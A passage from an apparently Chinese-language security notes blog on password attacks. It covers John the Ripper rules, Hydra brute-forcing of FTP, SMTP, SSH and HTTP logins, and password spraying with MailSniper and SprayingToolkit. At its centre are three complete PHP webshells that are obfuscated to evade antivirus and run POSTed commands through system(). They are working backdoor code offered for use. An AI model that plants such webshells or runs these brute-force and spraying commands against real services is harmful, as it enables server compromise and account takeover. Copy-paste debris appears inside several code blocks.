100.00% (2021-10-11 13:56) 3016Kp/s tryhackme999999</span><br></pre></td></tr></table></figure><p>我们可以看到，<code>Tryh@ckm3</code> 已成功生成。这说明 <code>KoreLogic</code> 规则能够创建更复杂的密码。</p><hr><h4 id="自定义规则（Custom-Rules）"><a href="#自定义规则（Custom-Rules）" class="headerlink" title="自定义规则（Custom Rules）"></a><strong>自定义规则（Custom Rules）</strong></h4><p>John the Ripper 允许我们<strong>自定义规则</strong>，可以在<strong>破解哈希时动态使用</strong>，或<strong>用于生成自定义密码字典</strong>。</p><h5 id="示例：自定义规则"><a href="#示例：自定义规则" class="headerlink" title="示例：自定义规则"></a><strong>示例：自定义规则</strong></h5><p>假设我们希望对现有的密码字典进行修改，使得每个密码：</p><ul><li>在<strong>前面</strong>添加<strong>特殊字符</strong>（<code>!@#$*&amp;</code>）</li><li>在<strong>后面</strong>添加<strong>0-9 的数字</strong></li></ul><p>密码格式示例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[symbols]word[0-9]</span><br></pre></td></tr></table></figure><p>我们可以在 <code>john.conf</code> 文件末尾添加自定义规则：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@machine$ sudo vi /etc/john/john.conf</span><br></pre></td></tr></table></figure><p>在文件中添加以下内容：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[List.Rules:THM-Password-Attacks]</span><br><span class="line">Az&quot;[0-9]&quot; ^[!@#$]</span><br></pre></td></tr></table></figure><p>规则解析：</p><ul><li><code>[List.Rules:THM-Password-Attacks]</code> 定义新规则的名称 <code>THM-Password-Attacks</code></li><li><code>Az</code> 代表从字典中提取单词</li><li><code>&quot;[0-9]&quot;</code> 在密码后<strong>追加</strong>一个数字（0-9）</li><li><code>^[!@#$]</code> 在密码前<strong>添加</strong>一个特殊字符（!@#$）<ul><li><code>^</code> 代表在开头插入字符</li><li>如果改成 <code>$</code>，则会在结尾插入字符</li></ul></li></ul><h5 id="测试自定义规则"><a href="#测试自定义规则" class="headerlink" title="测试自定义规则"></a><strong>测试自定义规则</strong></h5><p>首先，创建一个包含单词 <code>password</code> 的测试字典：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@machine$ echo &quot;password&quot; &gt; /tmp/single.lst</span><br></pre></td></tr></table></figure><p>使用 <code>THM-Password-Attacks</code> 规则扩展密码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@machine$ john --wordlist=/tmp/single.lst --rules=THM-Password-Attacks --stdout</span><br></pre></td></tr></table></figure><p>示例输出：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Using default input encoding: UTF-8</span><br><span class="line">!password0</span><br><span class="line">@password0</span><br><span class="line">#password0</span><br><span class="line">$password0</span><br></pre></td></tr></table></figure><hr><h4 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a><strong>总结</strong></h4><ol><li><strong>规则攻击</strong>（Rule-Based Attacks）利用已知的密码策略进行变形，生成符合策略的密码。</li><li>John the Ripper 提供了<strong>多种内置规则</strong>（如 <code>best64</code>、<code>KoreLogic</code>），可用于扩展密码字典。</li><li><strong>自定义规则</strong>可在 <code>john.conf</code> 配置文件中定义，以更精确地控制密码的生成方式。</li><li>通过 <code>--stdout</code> 选项，可以直接查看规则生成的密码列表，便于测试和优化策略。</li></ol><p>现在，你可以尝试创建自己的<strong>自定义规则</strong>，进一步优化你的密码字典！</p><h3 id="在线密码攻击"><a href="#在线密码攻击" class="headerlink" title="在线密码攻击"></a>在线密码攻击</h3><p>在线密码攻击是指针对使用用户名和密码身份验证方案的网络服务进行密码猜测攻击，其中包括 HTTP、SSH、VNC、FTP、SNMP、POP3 等服务。本节将介绍使用 Hydra 这一常见工具对各种网络服务的登录系统进行攻击。</p><h4 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h4><p>Hydra 支持对多种网络服务进行攻击。在本节中，我们将使用 Hydra 对网络服务（如 Web 登录页面、FTP、SMTP 和 SSH）进行暴力破解。在 Hydra 中，每种服务都有其特定的选项，因此熟悉其语法需要一定的学习成本。建议在使用时查阅帮助选项，以了解更多信息和功能。</p><h4 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h4><p>在以下场景中，我们将对 FTP 服务器进行暴力破解。通过查看 Hydra 的帮助选项，我们可以得知攻击 FTP 服务器的命令语法如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@machine$ hydra -l ftp -P passlist.txt ftp://10.10.x.x</span><br></pre></td></tr></table></figure><p><strong>参数解析：</strong></p><ul><li><code>-l ftp</code> 指定单个用户名，使用 <code>-L</code> 选项可以指定包含多个用户名的字典文件。</li><li><code>-P</code> 指定密码字典文件的完整路径，若要指定单个密码，则使用 <code>-p</code> 选项。</li><li><code>ftp://10.10.x.x</code> 指定协议及目标的 IP 地址或完整域名（FQDN）。</li></ul><p>请记住，在尝试暴力破解之前，可以先尝试默认凭据。有时无需暴力破解就能成功访问目标。请尝试攻击附带的虚拟机上的 FTP 服务器，并回答问题。</p><h4 id="SMTP"><a href="#SMTP" class="headerlink" title="SMTP"></a>SMTP</h4><p>与 FTP 服务器类似，我们也可以使用 Hydra 对 SMTP 服务器进行暴力破解，语法与前述示例类似，唯一不同的是目标协议。请注意，如果要尝试使用其他在线密码攻击工具，可能需要手动指定端口号，例如 SMTP 的默认端口号为 <code>25</code>。建议先查阅工具的帮助选项。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">user@machine$ hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v</span><br></pre></td></tr></table></figure><p>示例输出：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">less复制编辑Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-13 03:41:08</span><br><span class="line">[INFO] 多个服务提供商已实施破解保护，建议先使用较小的字典文件进行测试，并确保操作合法！</span><br><span class="line">[DATA] 每台服务器最多允许 7 个并行任务，总共 7 个任务，7 次登录尝试（l:1/p:7），约 1 次尝试/任务</span><br><span class="line">[DATA] 攻击目标 smtp://10.10.x.x:25/</span><br><span class="line">[VERBOSE] 解析地址中… [VERBOSE] 解析完成</span><br><span class="line">[VERBOSE] 使用 SMTP LOGIN 认证机制</span><br><span class="line">[25][smtp] 目标主机: 10.10.x.x   用户名: email@company.xyz   密码: xxxxxxxx</span><br><span class="line">[STATUS] 目标 10.10.x.x 的攻击完成（等待所有子任务执行完毕）</span><br><span class="line">1 个目标成功破解，找到 1 组有效凭据</span><br></pre></td></tr></table></figure><h4 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h4><p>如果服务器暴露在互联网上，SSH 暴力破解是一种常见的攻击方式。Hydra 支持多种协议，包括 SSH。可以使用类似的命令进行 SSH 攻击。请注意，密码攻击依赖于高质量的字典文件，以提高破解成功率。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">user@machine$ hydra -L users.lst -P /path/to/wordlist.txt ssh://10.10.x.x -v</span><br></pre></td></tr></table></figure><p>示例输出：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">csharp复制编辑Hydra v8.6 (c) 2017 by van Hauser/THC - 请勿在军事、秘密机构或非法用途下使用。</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-13 03:48:00</span><br><span class="line">[WARNING] 许多 SSH 配置限制了并行任务数量，建议减少任务数：使用 -t 4</span><br><span class="line">[DATA] 每台服务器最多允许 8 个并行任务，总共 8 个任务，8 次登录尝试（l:1/p:8），约 1 次尝试/任务</span><br><span class="line">[DATA] 攻击目标 ssh://10.10.x.x:22/</span><br><span class="line">[VERBOSE] 解析地址中… [VERBOSE] 解析完成</span><br><span class="line">[INFO] 测试是否支持 SSH 密码认证 ssh://user@10.10.x.x:22</span><br><span class="line">[INFO] 成功，目标支持 SSH 密码认证</span><br><span class="line">[22][ssh] 目标主机: 10.10.x.x   用户名: victim   密码: xxxxxxxx</span><br><span class="line">[STATUS] 目标 10.10.x.x 的攻击完成（等待所有子任务执行完毕）</span><br><span class="line">1 个目标成功破解，找到 1 组有效凭据</span><br></pre></td></tr></table></figure><h4 id="HTTP-登录页面"><a href="#HTTP-登录页面" class="headerlink" title="HTTP 登录页面"></a>HTTP 登录页面</h4><p>在此场景中，我们将对 HTTP 登录页面进行暴力破解。首先，需要了解攻击目标的请求类型。使用 Hydra 时，必须明确 HTTP 请求类型（GET 或 POST）。可以使用 <code>hydra http-get-form -U</code> 查看相关选项。</p><p>Hydra 针对 <code>http-get-form</code> 选项的基本语法如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php-template</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">&lt;url&gt;:&lt;表单参数&gt;:&lt;条件字符串&gt;[:&lt;可选项&gt;[:&lt;可选项&gt;]]</span><br></pre></td></tr></table></figure><p>我们需要分析需要发送的 HTTP 请求，可以使用浏览器开发者工具或 Burp Suite 进行分析。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">user@machine$ hydra -l admin -P 500-worst-passwords.txt 10.10.x.x http-get-form &quot;/login-get/index.php:username=^USER^&amp;password=^PASS^:S=logout.php&quot; -f</span><br></pre></td></tr></table></figure><p>示例输出：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">csharp复制编辑Hydra v8.6 (c) 2017 by van Hauser/THC - 请勿在军事、秘密机构或非法用途下使用。</span><br><span class="line"></span><br><span class="line">Hydra (http://www.thc.org/thc-hydra) starting at 2021-10-13 08:06:22 </span><br><span class="line">[DATA] 每台服务器最多允许 16 个并行任务，总共 16 个任务，500 次登录尝试（l:1/p:500），约 32 次尝试/任务 </span><br><span class="line">[DATA] 攻击目标 http-get-form://10.10.x.x:80//login-get/index.php:username=^USER^&amp;password=^PASS^:S=logout.php </span><br><span class="line">[80][http-get-form] 目标主机: 10.10.x.x   用户名: admin   密码: xxxxxx </span><br><span class="line">1 个目标成功破解，找到 1 组有效凭据 </span><br><span class="line">Hydra (http://www.thc.org/thc-hydra) </span><br><span class="line">finished at 2021-10-13 08:06:45</span><br></pre></td></tr></table></figure><p><strong>参数解析：</strong></p><ul><li><code>-l admin</code> 指定单个用户名，使用 <code>-L</code> 选项可以指定用户名字典文件。</li><li><code>-P</code> 指定密码字典文件的完整路径，若要指定单个密码，则使用 <code>-p</code> 选项。</li><li><code>10.10.x.x</code> 目标的 IP 地址或完整域名（FQDN）。</li><li><code>http-get-form</code> 指定 HTTP 请求类型，可选择 <code>http-get-form</code> 或 <code>http-post-form</code>。</li><li><code>/login-get/index.php</code> 目标 Web 服务器上登录页面的路径。</li><li><code>username=^USER^&amp;password=^PASS^</code> 需要暴力破解的参数，<code>^USER^</code> 代表用户名，<code>^PASS^</code> 代表密码，将分别从字典文件中提取值。</li><li><code>S=logout.php</code> 指定成功条件，例如成功登录后会出现 <code>logout.php</code>，Hydra 可以据此判断有效凭据。</li><li><code>-f</code> 选项在找到有效用户名和密码后立即停止暴力破解攻击。</li></ul><p>可以在提供的虚拟机上尝试访问 <code>http://MACHINE_IP/login-get/index.php</code> 进行测试，确保已经部署了虚拟机以回答相关问题。</p><h4 id="其他在线密码攻击工具"><a href="#其他在线密码攻击工具" class="headerlink" title="其他在线密码攻击工具"></a>其他在线密码攻击工具</h4><p>除了 Hydra 之外，还可以尝试其他在线密码攻击工具，以扩展知识面：</p><ul><li><strong>Medusa</strong></li><li><strong>Ncrack</strong></li><li>其他工具！</li></ul><h3 id="免杀webshell-php"><a href="#免杀webshell-php" class="headerlink" title="免杀webshell(php)"></a>免杀webshell(php)</h3><h4 id="采用反序列化-自定义加密解密函数绕过-分块加密"><a href="#采用反序列化-自定义加密解密函数绕过-分块加密" class="headerlink" title="采用反序列化+自定义加密解密函数绕过+分块加密"></a>采用反序列化+自定义加密解密函数绕过+分块加密</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 序列化函数</span><br><span class="line">function serializeData($num1, $num2)</span><br><span class="line">&#123;</span><br><span class="line">    // 创建一个关联数组来存储数据</span><br><span class="line">    $data = [</span><br><span class="line">        &quot;num1&quot; =&gt; $num1,</span><br><span class="line">        &quot;num2&quot; =&gt; $num2</span><br><span class="line">    ];</span><br><span class="line">    // 使用PHP的serialize函数将数组序列化为字符串</span><br><span class="line">    return serialize($data);</span><br><span class="line">&#125;</span><br><span class="line">// 反序列化函数</span><br><span class="line">function unserializeData($serializedString)</span><br><span class="line">&#123;</span><br><span class="line">    // 使用PHP的unserialize函数将字符串反序列化为数组</span><br><span class="line">    $data = unserialize($serializedString);</span><br><span class="line">    return $data;</span><br><span class="line">&#125;</span><br><span class="line">// 示例：序列化和反序列化</span><br><span class="line">function get_data()</span><br><span class="line">&#123;</span><br><span class="line">    $num1 = $_POST[&quot;num1&quot;] ?? null;  // 获取num1，如果没有则为null</span><br><span class="line">    $num2 = $_POST[&quot;num2&quot;] ?? null;  // 获取num2，如果没有则为null</span><br><span class="line">    return array($num1, $num2);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function get_system()</span><br><span class="line">&#123;</span><br><span class="line">    $a = &quot;sysaers&quot;;</span><br><span class="line">    $b = &quot;tem&quot;;</span><br><span class="line">&#125;</span><br><span class="line">function encrypt($data, $key)</span><br><span class="line">&#123;</span><br><span class="line">    $method = &quot;AES-256-CBC&quot;;</span><br><span class="line">    $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length($method));</span><br><span class="line">    $encrypted = openssl_encrypt($data, $method, $key, 0, $iv);</span><br><span class="line">    return base64_encode($iv . $encrypted);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 解密函数</span><br><span class="line">function decrypt($encrypted, $key)</span><br><span class="line">&#123;</span><br><span class="line">    $data = base64_decode($encrypted);</span><br><span class="line">    $ivLength = openssl_cipher_iv_length(&quot;AES-256-CBC&quot;);</span><br><span class="line">    $iv = substr($data, 0, $ivLength);</span><br><span class="line">    $encryptedData = substr($data, $ivLength);</span><br><span class="line">    return openssl_decrypt($encryptedData, &quot;AES-256-CBC&quot;, $key, 0, $iv);</span><br><span class="line">&#125;</span><br><span class="line">function splitData($data)</span><br><span class="line">&#123;</span><br><span class="line">    $part1 = &quot;&quot;;</span><br><span class="line">    $part2 = &quot;&quot;;</span><br><span class="line">    for ($i = 0; $i &lt; strlen($data); $i++) &#123;</span><br><span class="line">        $byte = ord($data[$i]);</span><br><span class="line">        $part1 .= chr($byte &amp; 0x0F);  // 保留低4位</span><br><span class="line">        $part2 .= chr($byte &amp; 0xF0);  // 保留高4位</span><br><span class="line">    &#125;</span><br><span class="line">    return [$part1, $part2];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 合并数据</span><br><span class="line">function mergeData($part1, $part2)</span><br><span class="line">&#123;</span><br><span class="line">    $merged = &quot;&quot;;</span><br><span class="line">    for ($i = 0; $i &lt; strlen($part1); $i++) &#123;</span><br><span class="line">        $byte1 = ord($part1[$i]);</span><br><span class="line">        $byte2 = ord($part2[$i]);</span><br><span class="line">        $merged .= chr($byte1 | $byte2);  // 按位或合并</span><br><span class="line">    &#125;</span><br><span class="line">    return $merged;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 序列化数据</span><br><span class="line">$key = &quot;my_secret_key_1234567890&quot;;</span><br><span class="line">$data1 = get_data();</span><br><span class="line">$data2 = $data1[0];</span><br><span class="line">list($part1, $part2) = splitData($data2);</span><br><span class="line">$encryptedPart1 = encrypt($part1, $key);</span><br><span class="line">$encryptedPart2 = encrypt($part2, $key);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 解密两部分数据</span><br><span class="line">$decryptedPart1 = decrypt($encryptedPart1, $key);</span><br><span class="line">$decryptedPart2 = decrypt($encryptedPart2, $key);</span><br><span class="line">$message = &quot;&quot;;</span><br><span class="line">$mergedData = mergeData($decryptedPart1, $decryptedPart2);</span><br><span class="line">system($mergedData, $message);</span><br><span class="line">echo $message;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="自定义加解密key-反序列化"><a href="#自定义加解密key-反序列化" class="headerlink" title="自定义加解密key+反序列化"></a>自定义加解密key+反序列化</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 序列化函数</span><br><span class="line">function serializeData($num1, $num2)</span><br><span class="line">&#123;</span><br><span class="line">    $data = [</span><br><span class="line">        &quot;num1&quot; =&gt; $num1,</span><br><span class="line">        &quot;num2&quot; =&gt; $num2</span><br><span class="line">    ];</span><br><span class="line">    return serialize($data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 反序列化函数</span><br><span class="line">function unserializeData($serializedString)</span><br><span class="line">&#123;</span><br><span class="line">    return unserialize($serializedString);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// XOR 加密函数</span><br><span class="line">function xorEncrypt($data, $key)</span><br><span class="line">&#123;</span><br><span class="line">    $encrypted = &#x27;&#x27;;</span><br><span class="line">    $keyLength = strlen($key);</span><br><span class="line">    for ($i = 0; $i &lt; strlen($data); $i++) &#123;</span><br><span class="line">        $encrypted .= $data[$i] ^ $key[$i % $keyLength];</span><br><span class="line">    &#125;</span><br><span class="line">    return base64_encode($encrypted);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// XOR 解密函数</span><br><span class="line">function xorDecrypt($encryptedData, $key)</span><br><span class="line">&#123;</span><br><span class="line">    $data = base64_decode($encryptedData);</span><br><span class="line">    $decrypted = &#x27;&#x27;;</span><br><span class="line">    $keyLength = strlen($key);</span><br><span class="line">    for ($i = 0; $i &lt; strlen($data); $i++) &#123;</span><br><span class="line">        $decrypted .= $data[$i] ^ $key[$i % $keyLength];</span><br><span class="line">    &#125;</span><br><span class="line">    return $decrypted;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 获取 POST 数据并加密</span><br><span class="line">function get_post()</span><br><span class="line">&#123;</span><br><span class="line">    if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;POST&#x27;) &#123;</span><br><span class="line">        $k = $&#123;&quot;_PO&quot; . &quot;ST&quot;&#125;[&quot;num1&quot;];</span><br><span class="line">        $B = $&#123;&quot;_PO&quot; . &quot;ST&quot;&#125;[&quot;num2&quot;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // 序列化数据</span><br><span class="line">        $serializedData = serializeData($k, $B);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // 加密密钥</span><br><span class="line">        $key = &quot;your-secret-key&quot;; // 密钥可以是任意字符串</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // 使用 XOR 加密序列化后的数据</span><br><span class="line">        $encryptedData = xorEncrypt($serializedData, $key);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        return $encryptedData;</span><br><span class="line">    &#125;</span><br><span class="line">    return null;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 解密和反序列化</span><br><span class="line">function decryptAndUnserialize($encryptedData, $key)</span><br><span class="line">&#123;</span><br><span class="line">    // 解密数据</span><br><span class="line">    $decryptedData = xorDecrypt($encryptedData, $key);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // 反序列化数据</span><br><span class="line">    $data = unserializeData($decryptedData);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    return $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 示例：获取加密数据并解密</span><br><span class="line">function getdata()</span><br><span class="line">&#123;</span><br><span class="line">    if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;POST&#x27;) &#123;</span><br><span class="line">        // 获取加密数据</span><br><span class="line">        $encryptedData = get_post();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // 解密密钥</span><br><span class="line">        $key = &quot;your-secret-key&quot;; // 必须与加密时一致</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // 解密并反序列化</span><br><span class="line">        $decryptedData = decryptAndUnserialize($encryptedData, $key);</span><br><span class="line">        echo $decryptedData[&quot;num1&quot;];</span><br><span class="line">        $message = &#x27;&#x27;;</span><br><span class="line">        system($decryptedData[&quot;num1&quot;], $message);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // 输出解密后的数据</span><br><span class="line">        print_r($message);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">getdata();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="魔法函数-自定义加解密"><a href="#魔法函数-自定义加解密" class="headerlink" title="魔法函数+自定义加解密"></a>魔法函数+自定义加解密</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 序列化函数</span><br><span class="line">function serializeData($num1, $num2)</span><br><span class="line">&#123;</span><br><span class="line">    $data = [</span><br><span class="line">        &quot;num1&quot; =&gt; $num1,</span><br><span class="line">        &quot;num2&quot; =&gt; $num2</span><br><span class="line">    ];</span><br><span class="line">    return serialize($data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 反序列化函数</span><br><span class="line">function unserializeData($serializedString)</span><br><span class="line">&#123;</span><br><span class="line">    return unserialize($serializedString);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// XOR 加密函数</span><br><span class="line">function xorEncrypt($data, $key)</span><br><span class="line">&#123;</span><br><span class="line">    $encrypted = &#x27;&#x27;;</span><br><span class="line">    $keyLength = strlen($key);</span><br><span class="line">    for ($i = 0; $i &lt; strlen($data); $i++) &#123;</span><br><span class="line">        $encrypted .= $data[$i] ^ $key[$i % $keyLength];</span><br><span class="line">    &#125;</span><br><span class="line">    return base64_encode($encrypted);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// XOR 解密函数</span><br><span class="line">function xorDecrypt($encryptedData, $key)</span><br><span class="line">&#123;</span><br><span class="line">    $data = base64_decode($encryptedData);</span><br><span class="line">    $decrypted = &#x27;&#x27;;</span><br><span class="line">    $keyLength = strlen($key);</span><br><span class="line">    for ($i = 0; $i &lt; strlen($data); $i++) &#123;</span><br><span class="line">        $decrypted .= $data[$i] ^ $key[$i % $keyLength];</span><br><span class="line">    &#125;</span><br><span class="line">    return $decrypted;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 获取 POST 数据并加密</span><br><span class="line">function get_post()</span><br><span class="line">&#123;</span><br><span class="line">    if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;POST&#x27;) &#123;</span><br><span class="line">        $k = $&#123;&quot;_PO&quot; . &quot;ST&quot;&#125;[&quot;num1&quot;];</span><br><span class="line">        $B = $&#123;&quot;_PO&quot; . &quot;ST&quot;&#125;[&quot;num2&quot;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // 序列化数据</span><br><span class="line">        $serializedData = serializeData($k, $B);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // 加密密钥</span><br><span class="line">        $key = &quot;your-secret-key&quot;; // 密钥可以是任意字符串</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // 使用 XOR 加密序列化后的数据</span><br><span class="line">        $encryptedData = xorEncrypt($serializedData, $key);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        return $encryptedData;</span><br><span class="line">    &#125;</span><br><span class="line">    return null;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 解密和反序列化</span><br><span class="line">function decryptAndUnserialize($encryptedData, $key)</span><br><span class="line">&#123;</span><br><span class="line">    // 解密数据</span><br><span class="line">    $decryptedData = xorDecrypt($encryptedData, $key);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // 反序列化数据</span><br><span class="line">    $data = unserializeData($decryptedData);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    return $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 示例：获取加密数据并解密</span><br><span class="line">function getdata()</span><br><span class="line">&#123;</span><br><span class="line">    if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;POST&#x27;) &#123;</span><br><span class="line">        // 获取加密数据</span><br><span class="line">        $encryptedData = get_post();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // 解密密钥</span><br><span class="line">        $key = &quot;your-secret-key&quot;; // 必须与加密时一致</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // 解密并反序列化</span><br><span class="line">        $decryptedData = decryptAndUnserialize($encryptedData, $key);</span><br><span class="line">        echo $decryptedData[&quot;num1&quot;];</span><br><span class="line">        $message = &#x27;&#x27;;</span><br><span class="line">        system($decryptedData[&quot;num1&quot;], $message);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // 输出解密后的数据</span><br><span class="line">        print_r($message);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">getdata();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="密码喷洒攻击"><a href="#密码喷洒攻击" class="headerlink" title="密码喷洒攻击"></a>密码喷洒攻击</h3><h4 id="SSH-1"><a href="#SSH-1" class="headerlink" title="SSH"></a>SSH</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -L usernames-list.txt -p Spring2021 ssh://10.1.1.10</span><br></pre></td></tr></table></figure><p>usernames-list.txt是你创建的用户名本</p><h4 id="RDP-远程桌面协议"><a href="#RDP-远程桌面协议" class="headerlink" title="RDP 远程桌面协议"></a>RDP 远程桌面协议</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 RDPassSpray.py -u victim -p Spring2021! -t 10.100.10.240:3026</span><br></pre></td></tr></table></figure><h4 id="MailSniper"><a href="#MailSniper" class="headerlink" title="MailSniper"></a>MailSniper</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/dafthack/MailSniper.git</span><br><span class="line">导入模块</span><br><span class="line">Import-Module .\MailSniper.ps1</span><br><span class="line">如果遇到 执行策略 限制，可以先运行：</span><br><span class="line">Set-ExecutionPolicy Unrestricted -Scope Process</span><br><span class="line">OWA 密码喷洒</span><br><span class="line">Invoke-PasswordSprayOWA -UserList users.txt -Password Winter2024</span><br><span class="line">EWS 密码喷洒</span><br><span class="line">Invoke-PasswordSprayEWS -UserList users.txt -Password Password123</span><br><span class="line">枚举邮箱</span><br><span class="line">Invoke-GlobalMailSearch -Mailbox admin@example.com -SearchTerms &quot;password&quot;</span><br><span class="line">这会在 admin@example.com 邮箱中搜索包含 &quot;password&quot; 关键词的邮件</span><br></pre></td></tr></table></figure><h4 id="SprayingToolkit"><a href="#SprayingToolkit" class="headerlink" title="SprayingToolkit"></a>SprayingToolkit</h4><h5 id="🔹-下载-SprayingToolkit"><a href="#🔹-下载-SprayingToolkit" class="headerlink" title="🔹 下载 SprayingToolkit"></a><strong>🔹 下载 SprayingToolkit</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/byt3bl33d3r/SprayingToolkit.git</span><br><span class="line">cd SprayingToolkit</span><br></pre></td></tr></table></figure><h5 id="🔹-安装依赖"><a href="#🔹-安装依赖" class="headerlink" title="🔹 安装依赖"></a><strong>🔹 安装依赖</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure><p>如果 <code>pip</code> 安装失败，尝试：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install --break-system-packages -r requirements.txt</span><br></pre></td></tr></table></figure><hr><h5 id="🚀-2-SprayingToolkit-使用示例"><a href="#🚀-2-SprayingToolkit-使用示例" class="headerlink" title="🚀 2. SprayingToolkit 使用示例"></a><strong>🚀 2. SprayingToolkit 使用示例</strong></h5><p>SprayingToolkit 主要由多个脚本组成，如 <code>owaSpray.py</code>、<code>o365Spray.py</code>、<code>smtpSpray.py</code> 等。</p><hr><h5 id="🔹-OWA（Outlook-Web-Access）密码喷洒"><a href="#🔹-OWA（Outlook-Web-Access）密码喷洒" class="headerlink" title="🔹 OWA（Outlook Web Access）密码喷洒"></a><strong>🔹 OWA（Outlook Web Access）密码喷洒</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python owaSpray.py -u users.txt -p Winter2024 -d example.com</span><br></pre></td></tr></table></figure><p>📌 <strong>参数解析：</strong></p><ul><li><code>-u users.txt</code>：包含用户名的文件</li><li><code>-p Winter2024</code>：尝试的密码</li><li><code>-d example.com</code>：目标域名</li></ul><hr><h5 id="🔹-O365（Office-365）密码喷洒"><a href="#🔹-O365（Office-365）密码喷洒" class="headerlink" title="🔹 O365（Office 365）密码喷洒"></a><strong>🔹 O365（Office 365）密码喷洒</strong></h5><figure class="highlight 